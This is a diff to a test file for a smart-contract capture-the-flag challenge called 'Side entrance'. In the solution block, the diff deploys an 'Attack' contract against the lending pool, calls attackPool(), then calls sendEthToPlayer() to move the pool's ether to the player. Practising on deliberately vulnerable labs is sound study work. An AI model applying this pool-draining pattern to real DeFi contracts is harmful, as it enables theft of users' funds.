@@ -12,7 +12,7 @@ describe('[Challenge] Side entrance', function () {
     before(async function () {
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
         [deployer, player] = await ethers.getSigners();
-
+console.log("Player address:",player.address)
         // Deploy pool and fund it
         pool = await (await ethers.getContractFactory('SideEntranceLenderPool', deployer)).deploy();
         await pool.deposit({ value: ETHER_IN_POOL });
@@ -26,6 +26,13 @@ describe('[Challenge] Side entrance', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const Attack=await hre.ethers.getContractFactory("Attack");
+        const attack=await Attack.deploy(pool.address);
+        await attack.deployed();
+        console.log("Attack contract deployed to:",attack.address)
+        await attack.attackPool();
+        await attack.sendEthToPlayer();
+
     });
 
     after(async function () {
